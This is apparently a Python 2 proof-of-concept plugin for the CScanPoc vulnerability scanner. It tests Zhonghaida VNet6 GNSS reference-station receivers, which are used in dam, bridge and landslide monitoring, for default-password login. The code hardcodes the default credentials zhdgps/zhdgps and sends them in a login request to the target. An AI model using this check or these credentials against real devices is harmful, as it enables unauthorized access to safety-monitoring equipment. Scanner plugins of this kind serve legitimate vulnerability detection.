# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Zhonghaida_0000' # 平台漏洞编号，留空
    name = '中海达VNet6专业型参考站接收机 默认口令登录'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。
        中海达VNet6专业型参考站接收机 用默认口令(zhdgps/zhdgps)即可登录成功。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '中海达VNet6专业型参考站接收机'  # 漏洞应用名称
    product_version = '中海达VNet6专业型参考站接收机'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'cfb80027-6ac2-4b3a-b3ef-27a4508fc4f2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            """
            该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。
            POC Name  : 中海达VNet6专业型参考站接收机 默认密码登录
            使用默认的账号密码(zhdgps/zhdgps)
            """
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/login.php'
            data = 'usr=zhdgps&psw=zhdgps&force=1&action=1&lang=zh&redirect=%2Findex.php%3Flang%3Dz'
            url = arg +  payload
            code, head,res, errcode, _ = hh.http(url, data)
            url2 = arg + '/index.php'
            code, head,res, errcode, _ = hh.http(url2)

            if '/pages/zh/download.php' in res and code == 200:
                #security_hole(url + '   user:zhdgps pass:zhdgps')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
